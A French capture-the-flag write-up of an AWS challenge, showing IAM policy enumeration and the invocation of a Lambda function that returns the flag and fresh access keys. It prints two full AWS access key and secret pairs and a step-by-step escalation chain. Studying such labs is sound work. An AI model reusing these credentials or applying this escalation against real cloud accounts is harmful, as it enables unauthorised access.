# Cloud : Alpha_Beta_Gamma... 1/2
**Challenge Author(s)**: SevenInside
**Difficulty**: Facile

## Configuration AWS 

Après avoir installé la [CLI AWS](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html), on configure un profile "hit" avec les credentials fournis par le challenge:

```bash
nano  ~/.aws/config

[profile hit]
region = eu-west-3
output = json
aws_access_key_id=AKIA5Q6X6L6EGQUEX4G4
aws_secret_access_key=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
```
***********************

## 🎯  FLAG1:

Afficher les informations au sujet de notre user:

```bash
root@HIT2025 ~ # aws iam get-user --profile hit
{
    "User": {
        "Path": "/",
        "UserName": "ctf-unprivileged-user",
        "UserId": "AIDA5Q6X6L6EIHMRMXDPW",
        "Arn": "arn:aws:iam::929776426888:user/ctf-unprivileged-user",
        "CreateDate": "2025-07-18T08:08:05+00:00",
        "Tags": [
            {
                "Key": "AKIA5Q6X6L6EGQUEX4G4",
                "Value": "ctf-unprivileged-user-accesskey"
            }
        ]
    }
}
```
On affiche les policies IAM attachées à notre utilisateur

```bash
root@HIT2025 ~ # aws iam list-attached-user-policies --user-name ctf-unprivileged-user --profile hit
{
    "AttachedPolicies": [
        {
            "PolicyName": "lambda-execution-ctf-unprivileged-user-policy",
            "PolicyArn": "arn:aws:iam::929776426888:policy/lambda-execution-ctf-unprivileged-user-policy"
        }
    ]

```

Même si son nom nous oriente vers le service lambda, on liste les actions autorisées par cette policy

```bash
root@HIT2025 ~ # aws iam get-policy --policy-arn arn:aws:iam::929776426888:policy/lambda-execution-ctf-unprivileged-user-policy
{
    "Policy": {
        "PolicyName": "lambda-execution-ctf-unprivileged-user-policy",
        "PolicyId": "ANPA5Q6X6L6EET4BPYZNE",
        "Arn": "arn:aws:iam::929776426888:policy/lambda-execution-ctf-unprivileged-user-policy",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2025-07-18T08:07:33+00:00",
        "UpdateDate": "2025-07-21T14:51:53+00:00",
        "Tags": []
    }
}
root@HIT2025 ~ # aws iam get-policy-version --policy-arn arn:aws:iam::929776426888:policy/lambda-execution-ctf-unprivileged-user-policy --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:SimulatePrincipalPolicy"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUser",
                        "iam:ListAttachedUserPolicies",
                        "iam:ListRoles",
                        "iam:ListUserPolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": [
                        "arn:aws:iam::*:user/ctf-unprivileged-user",
                        "arn:aws:iam::*:policy/lambda-execution-ctf-unprivileged-user-policy"
                    ]
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:ListFunctions",
                        "lambda:InvokeFunction"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2025-07-21T14:51:53+00:00"
    }
}
```

On est effectivement autorisé à lister les fonctions lambda et à les invoquer.

```bash
root@HIT2025 ~ # aws lambda list-functions --profile hit
{
    "Functions": [
        {
            "FunctionName": "GetPrivilegedAccess",
            "FunctionArn": "arn:aws:lambda:eu-west-3:929776426888:function:GetPrivilegedAccess",
            "Runtime": "python3.13",
            "Role": "arn:aws:iam::929776426888:role/service-role/GetPrivilegedAccess-role-ty3jmhyj",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 338,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-07-18T09:36:49.000+0000",
            "CodeSha256": "tV0+qlVm+dyA7LCauJS7pqM4W0K7B6JRLMQfmzlkEwM=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "b19bc412-52fd-4d34-9632-34c3fe8cf121",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
```
****

🔥 On va exploiter la fonction Lambda, et le Flag apparait, ainsi que ce qui semble être de nouveau accès AWS :

```bash
root@HIT2025 ~ # aws lambda invoke \
  --function-name GetPrivilegedAccess \
  --cli-binary-format raw-in-base64-out \
  --profile hit \
  output.json && cat output.json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
{"statusCode": 200, "body": "\"hit\\\\{WelcomeOnPublicCloud\\\\} -- AKIA5Q6X6L6EPTLPKBFK:hNylk2SGuLj9ayXFIauwFGA3zlEW5BF/m8Xo8t6h\""}#
```

🎉 hit{WelcomeOnPublicCloud}
